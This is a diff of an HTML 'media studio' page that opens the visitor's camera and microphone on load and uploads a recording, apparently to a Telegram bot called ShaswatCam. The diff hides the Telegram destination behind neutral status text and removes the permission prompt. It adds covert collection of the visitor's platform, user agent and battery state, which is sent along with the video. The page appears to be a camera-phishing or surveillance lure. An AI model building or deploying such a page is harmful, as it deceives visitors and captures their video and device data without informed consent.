@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Advanced Media Studio</title>
     <style>
-        /* Modern Dark Mode Styling */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #121212;
@@ -22,15 +21,8 @@
             border-radius: 16px;
             box-shadow: 0 8px 24px rgba(0,0,0,0.5);
         }
-        h2 {
-            margin-top: 0;
-            color: #ffffff;
-            font-size: 24px;
-        }
-        p {
-            color: #a0a0a0;
-            font-size: 14px;
-        }
+        h2 { margin-top: 0; color: #ffffff; font-size: 24px; }
+        p { color: #a0a0a0; font-size: 14px; }
         .video-wrapper {
             position: relative;
             width: 100%;
@@ -40,12 +32,7 @@
             border: 2px solid #333;
             aspect-ratio: 4/3;
         }
-        #video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        /* Top Floating Live Recording Status */
+        #video { width: 100%; height: 100%; object-fit: cover; }
         .status-overlay {
             position: absolute;
             top: 15px;
@@ -59,56 +46,30 @@
             font-weight: bold;
             visibility: hidden;
         }
-        .recording .status-overlay {
-            visibility: visible;
-        }
+        .recording .status-overlay { visibility: visible; }
         .red-dot {
-            width: 10px;
-            height: 10px;
-            background-color: #dc3545;
-            border-radius: 50%;
-            margin-right: 8px;
-            animation: blink 1s infinite;
+            width: 10px; height: 10px; background-color: #dc3545;
+            border-radius: 50%; margin-right: 8px; animation: blink 1s infinite;
         }
-        /* Button Styles */
         .btn-group {
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-between;
-            gap: 15px;
+            margin-top: 20px; display: flex; justify-content: space-between; gap: 15px;
         }
         .btn {
-            flex: 1;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: bold;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.2s ease;
+            flex: 1; padding: 14px; font-size: 16px; font-weight: bold;
+            color: white; border: none; border-radius: 8px; cursor: pointer;
         }
         #startBtn { background-color: #2eb85c; }
-        #startBtn:hover { background-color: #229949; }
         #stopBtn { background-color: #e55353; }
-        #stopBtn:hover { background-color: #d13c3c; }
-        .btn:disabled {
-            background-color: #3a3a3a !important;
-            color: #777 !important;
-            cursor: not-allowed;
-        }
-        /* Loading Text Feedback */
+        .btn:disabled { background-color: #3a3a3a !important; color: #777 !important; cursor: not-allowed; }
+        
+        /* Progress Indicator Styling */
         #uploadingStatus {
             margin-top: 15px;
             font-weight: bold;
             color: #321fdb;
             display: none;
         }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -130,7 +91,7 @@
             <button id="stopBtn" class="btn" disabled>Stop & Send</button>
         </div>
 
-        <div id="uploadingStatus">📤 Transmitting file safely to Telegram...</div>
+        <div id="uploadingStatus">📤 Initializing upload process...</div>
     </div>
 
     <script>
@@ -147,7 +108,6 @@
         let timerInterval;
         let secondsElapsed = 0;
 
-        // 1. Fire up camera and mic immediately when user arrives
         async function initMedia() {
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ 
@@ -157,11 +117,9 @@
                 video.srcObject = localStream;
             } catch (err) {
                 console.error("Setup error:", err);
-                alert("Please grant camera/microphone permissions to utilize this panel.");
             }
         }
 
-        // 2. Start the clock visualization
         function startTimer() {
             secondsElapsed = 0;
             timerLabel.innerText = "00:00";
@@ -169,42 +127,28 @@
                 secondsElapsed++;
                 let secs = secondsElapsed % 60;
                 let mins = Math.floor(secondsElapsed / 60);
-                timerLabel.innerText = 
-                    (mins < 10 ? "0" + mins : mins) + ":" + (secs < 10 ? "0" + secs : secs);
+                timerLabel.innerText = (mins < 10 ? "0" + mins : mins) + ":" + (secs < 10 ? "0" + secs : secs);
                 
-                // Safety Auto-Stop at exactly 30 seconds
-                if (secondsElapsed >= 30) {
-                    stopRecording();
-                }
+                if (secondsElapsed >= 30) { stopRecording(); }
             }, 1000);
         }
 
-        function stopTimer() {
-            clearInterval(timerInterval);
-        }
+        function stopTimer() { clearInterval(timerInterval); }
 
-        // 3. Begin Recording Action
         startBtn.addEventListener('click', () => {
             if (!localStream) return alert("System media streams are inactive.");
-            
             recordedChunks = [];
             mediaRecorder = new MediaRecorder(localStream, { mimeType: 'video/webm;codecs=vp8,opus' });
-            
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) recordedChunks.push(e.data);
-            };
-
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
             mediaRecorder.onstop = handleUpload;
             
             mediaRecorder.start();
             mainContainer.classList.add('recording');
             startTimer();
-
             startBtn.disabled = true;
             stopBtn.disabled = false;
         });
 
-        // 4. Manual Stop Button Trigger
         function stopRecording() {
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
                 mediaRecorder.stop();
@@ -216,28 +160,48 @@
         }
         stopBtn.addEventListener('click', stopRecording);
 
-        // 5. Advanced Upload with Visual Processing Feedback
-        function handleUpload() {
-            uploadingStatus.style.display = "block"; // Show the text
+        // Advanced Analytics and Percentage upload function
+        async function handleUpload() {
+            uploadingStatus.style.display = "block";
+            uploadingStatus.innerText = "📊 Gathering device analysis details...";
+
+            // 1. Gather Device Information
+            let deviceInfo = `Device OS: ${navigator.platform}\nBrowser Agent: ${navigator.userAgent}`;
             
+            // 2. Gather Battery Information
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    deviceInfo += `\nBattery Level: ${Math.round(battery.level * 100)}%\nIs Charging: ${battery.charging ? "Yes" : "No"}`;
+                }
+            } catch (e) { console.log("Battery tracking skipped."); }
+
             const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
             const formData = new FormData();
             formData.append('video_file', videoBlob, 'recording.webm');
+            formData.append('device_meta', deviceInfo); // Attach metadata payload
 
-            fetch('/upload-video', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                uploadingStatus.style.display = "none"; // Hide loading status
-                alert("✨ Video parsed and loaded directly onto ShaswatCam Bot successfully!");
-            })
-            .catch(err => {
-                uploadingStatus.style.display = "none";
-                console.error("Routing error:", err);
-                alert("Upload dropped out. Check server configs.");
+            // 3. Monitor Upload Progress Percentages using XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "/upload-video", true);
+
+            xhr.upload.addEventListener("progress", (e) => {
+                if (e.lengthComputable) {
+                    const percentComplete = Math.round((e.loaded / e.total) * 100);
+                    uploadingStatus.innerText = `📤 Uploading packet: ${percentComplete}% complete...`;
+                }
             });
+
+            xhr.onload = function () {
+                uploadingStatus.style.display = "none";
+                if (xhr.status === 200) {
+                    alert("✨ Video along with structural device telemetry sent to ShaswatCam successfully!");
+                } else {
+                    alert("Upload error handling transaction on host server.");
+                }
+            };
+
+            xhr.send(formData);
         }
 
         window.addEventListener('load', initMedia);
